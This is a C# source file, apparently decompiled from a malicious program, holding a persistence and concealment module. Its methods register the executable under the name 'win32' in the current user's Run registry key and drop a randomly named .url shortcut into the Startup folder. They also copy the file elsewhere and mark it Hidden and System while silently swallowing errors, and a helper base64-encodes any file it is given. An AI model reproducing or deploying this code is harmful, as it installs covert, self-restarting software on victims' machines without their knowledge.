using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

internal sealed class Class3
{
	public enum Enum0
	{

	}

	private string string_0;

	public Class3(string string_1)
	{
		string_0 = string_1;
	}

	public bool method_0(string string_1)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				string text = array[num];
				if (text.Equals(string_1))
				{
					break;
				}
				num++;
				continue;
			}
			registryKey.Close();
			return false;
		}
		return true;
	}

	public string method_1(string string_1)
	{
		string result = string.Empty;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		foreach (string text in array)
		{
			if (text.Equals(string_1))
			{
				try
				{
					result = registryKey.GetValue(text)!.ToString();
				}
				catch
				{
				}
				break;
			}
		}
		registryKey.Close();
		return result;
	}

	public void method_2(Enum0 enum0_0)
	{
		if (enum0_0 == (Enum0)0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("win32", string_0);
			registryKey.Close();
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + Path.GetRandomFileName() + ".url");
		try
		{
			string location = Assembly.GetExecutingAssembly().Location;
			streamWriter.WriteLine("[InternetShortcut]");
			streamWriter.WriteLine("URL=file:///" + string_0);
			streamWriter.WriteLine("IconIndex=0");
			string text = location.Replace('\\', '/');
			streamWriter.WriteLine("IconFile=" + text);
			streamWriter.Flush();
		}
		finally
		{
			((IDisposable)streamWriter).Dispose();
		}
	}

	public void method_3(string string_1)
	{
		try
		{
			File.Copy(string_0, string_1, overwrite: true);
		}
		catch
		{
		}
	}

	public void method_4()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(string_0);
			fileInfo.Attributes = fileInfo.Attributes | FileAttributes.Hidden | FileAttributes.System;
		}
		catch
		{
		}
	}

	public static string smethod_0(string string_1)
	{
		FileStream fileStream = new FileStream(string_1, FileMode.Open, FileAccess.Read);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
		return Convert.ToBase64String(array, Base64FormattingOptions.InsertLineBreaks);
	}
}
